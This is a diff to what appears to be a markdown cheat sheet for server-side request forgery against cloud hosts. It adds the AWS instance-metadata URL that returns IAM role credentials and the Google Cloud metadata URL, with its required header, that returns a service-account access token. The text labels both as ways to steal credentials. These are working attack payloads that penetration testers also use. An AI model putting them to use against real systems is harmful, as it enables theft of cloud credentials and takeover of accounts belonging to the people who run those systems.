@@ -44,7 +44,23 @@ To retrieve general information (e.g., hostname, IAM role name) from the AWS met
 The respective metadata information (e.g., admin-role) is returned.
 ```
 http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/{role-name}
 ```
+To steal temporary credentials (Access Key, Secret Key, Token) for the specified IAM role.<p>
+AWS credentials are returned in JSON format.
+```
+http://169.254.169.254/latest/meta-data/iam/security-credentials/{role-name}
+```
+
+## Cloud Metadata Access (Google Cloud)
+To steal the access token for the service account in Google Cloud.<p>
+An access token is returned in JSON format.
+```
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token (Header: Metadata-Flavor: Google)
+```
+
+
+
 
 
 
